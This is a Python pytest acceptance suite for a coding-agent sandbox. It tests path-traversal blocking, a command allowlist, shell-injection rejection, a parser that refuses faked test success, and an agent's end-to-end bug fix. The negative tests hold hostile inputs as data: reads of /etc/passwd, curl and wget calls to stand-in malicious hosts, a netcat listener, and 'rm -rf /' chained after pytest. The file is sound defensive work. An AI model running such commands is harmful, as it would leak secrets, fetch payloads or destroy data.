"""
Project Jarvis — Milestone 4 Execution & Sandboxing Acceptance Test Suite.
Verifies filesystem path traversal defense, command allowlists, shell injection rejection,
honest test parsing, and end-to-end coding agent execution on a real test codebase.
"""

from pathlib import Path
import pytest
import sys
from app.providers.mock import MockAIProvider
from app.workers.command_policy import CommandPolicyViolation, validate_and_tokenize_command
from app.workers.coding_agent import CodingAgent
from app.workers.filesystem import SandboxedFilesystem, SecurityException
from app.workers.runner import LocalSandboxRunner
from app.workers.test_parser import parse_test_results


def test_filesystem_path_traversal_blocked(tmp_path: Path):
    """
    CRITICAL SECURITY ACCEPTANCE TEST:
    Verify that filesystem operations cannot escape the assigned workspace.
    """
    fs = SandboxedFilesystem(tmp_path)

    # Valid in-sandbox operations
    bytes_written = fs.write_file("src/app.py", "print('hello world')")
    assert bytes_written > 0
    assert fs.read_file("src/app.py") == "print('hello world')"
    assert "src/app.py" in fs.list_files()

    # Path traversal attempts MUST fail with SecurityException
    with pytest.raises(SecurityException):
        fs.read_file("../../etc/passwd")

    with pytest.raises(SecurityException):
        fs.write_file("../malicious.sh", "evil code")

    with pytest.raises(SecurityException):
        fs.resolve_safe_path("C:/Windows/System32/calc.exe")


def test_command_policy_allowlist_and_injection_defense():
    """
    CRITICAL SECURITY ACCEPTANCE TEST:
    Verify that only vetted binaries run and shell injection is strictly blocked.
    """
    # 1. Allowed commands tokenize cleanly
    assert validate_and_tokenize_command("pytest -v tests/") == ["pytest", "-v", "tests/"]
    assert validate_and_tokenize_command("python -m unittest") == ["python", "-m", "unittest"]
    assert validate_and_tokenize_command("git status") == ["git", "status"]

    # 2. Blocked utilities fail with CommandPolicyViolation
    with pytest.raises(CommandPolicyViolation) as exc:
        validate_and_tokenize_command("curl https://malicious-exfiltration.com")
    assert "is not in the approved worker allowlist" in exc.value.detail

    with pytest.raises(CommandPolicyViolation):
        validate_and_tokenize_command("wget http://bad-site.org/payload.sh")

    with pytest.raises(CommandPolicyViolation):
        validate_and_tokenize_command("nc -lvp 4444")

    # 3. Shell chaining and redirection meta-characters fail immediately
    with pytest.raises(CommandPolicyViolation) as exc_chain:
        validate_and_tokenize_command("pytest; rm -rf /")
    assert "Shell meta-character ';'" in exc_chain.value.detail

    with pytest.raises(CommandPolicyViolation):
        validate_and_tokenize_command("pytest && python -c 'import os'")

    with pytest.raises(CommandPolicyViolation):
        validate_and_tokenize_command("python test.py > exfiltrate.txt")


def test_honest_test_parser():
    """
    CRITICAL ACCURACY ACCEPTANCE TEST:
    Verify tests are marked passed ONLY when exit_code == 0.
    """
    # True pass
    pass_res = parse_test_results(0, "== 5 passed in 0.12s ==", "")
    assert pass_res["passed"] is True
    assert pass_res["exit_code"] == 0
    assert pass_res["passed_count"] == 5

    # Real failure
    fail_res = parse_test_results(1, "FAILED tests/test_calc.py::test_div", "AssertionError: 1 != 2")
    assert fail_res["passed"] is False
    assert fail_res["exit_code"] == 1
    assert fail_res["failed_count"] >= 1

    # Adversarial test: Output claims success but exit_code is 1
    lying_res = parse_test_results(1, "All 100 tests passed brilliantly!", "")
    assert lying_res["passed"] is False
    assert lying_res["exit_code"] == 1


@pytest.mark.asyncio
async def test_end_to_end_coding_agent_on_real_codebase(tmp_path: Path):
    """
    MILESTONE 4 COMPLETE ACCEPTANCE TEST:
    Coding agent receives a task against a real test codebase,
    applies a targeted code fix, executes real tests in sandbox, and reports evidence.
    """
    # 1. Setup real mini Python project in tmp_path
    src_dir = tmp_path / "src"
    src_dir.mkdir(parents=True, exist_ok=True)
    tests_dir = tmp_path / "tests"
    tests_dir.mkdir(parents=True, exist_ok=True)

    # Broken code: divide crashes on b == 0
    (src_dir / "calculator.py").write_text(
        "def calculate(a, b):\n"
        "    return a / b\n",
        encoding="utf-8"
    )

    # Unit test asserting calculate(10, 0) == 0
    (tests_dir / "test_calc.py").write_text(
        "import sys\n"
        "from pathlib import Path\n"
        "sys.path.insert(0, str(Path(__file__).parent.parent))\n"
        "from src.calculator import calculate\n\n"
        "def test_calculate_normal():\n"
        "    assert calculate(10, 2) == 5\n\n"
        "def test_calculate_zero_division():\n"
        "    assert calculate(10, 0) == 0\n",
        encoding="utf-8"
    )

    # 2. Instantiate sandbox runner and coding agent
    runner = LocalSandboxRunner(workspace_root=tmp_path, timeout_seconds=15)
    provider = MockAIProvider()  # Returns solution fixing calculate() null-check
    agent = CodingAgent(runner=runner, ai_provider=provider)

    # 3. Execute the coding assignment with real pytest execution
    # Use the active virtualenv python executable running pytest
    python_exe = sys.executable
    test_cmd = f"{python_exe} -m pytest tests"

    report = await agent.execute_task(
        task_title="Fix ZeroDivisionError in calculate function",
        task_description="When b is 0, calculate should return 0 instead of crashing.",
        test_command=test_cmd,
        max_retries=2
    )

    # 4. Verify outcomes and real execution evidence
    assert report["status"] == "COMPLETED"
    assert report["test_evidence"]["passed"] is True
    assert report["test_evidence"]["exit_code"] == 0
    assert "2 passed" in report["test_evidence"]["raw_output"]
    assert "src/calculator.py" in report["files_modified"]

    # Verify that the actual file on disk was modified correctly
    modified_content = (src_dir / "calculator.py").read_text(encoding="utf-8")
    assert "if b == 0:" in modified_content
    assert "return 0" in modified_content
